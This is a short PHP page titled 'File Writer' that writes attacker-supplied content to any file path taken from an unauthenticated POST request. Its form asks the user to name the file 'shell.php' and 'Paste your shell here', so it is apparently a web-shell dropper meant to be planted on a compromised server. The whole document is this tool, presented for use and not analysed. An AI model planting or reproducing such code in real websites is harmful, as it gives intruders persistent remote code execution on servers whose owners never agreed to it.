<?php 
  $a = $_POST['code'];
  $file = fopen($_POST['file'],'w');
  fwrite($file,$a);
  fclose($file);
?>
<center>
  <form method="post" id="form">
    <h2>File Writer</h2>
    File Name<br><input type="text" name="file" placeholder="shell.php"><br>
    Shell Code<br><textarea name="code" form="form" placeholder="Paste your shell here"></textarea><br>
    <input type="submit" value="Write">
  </form>
</center>
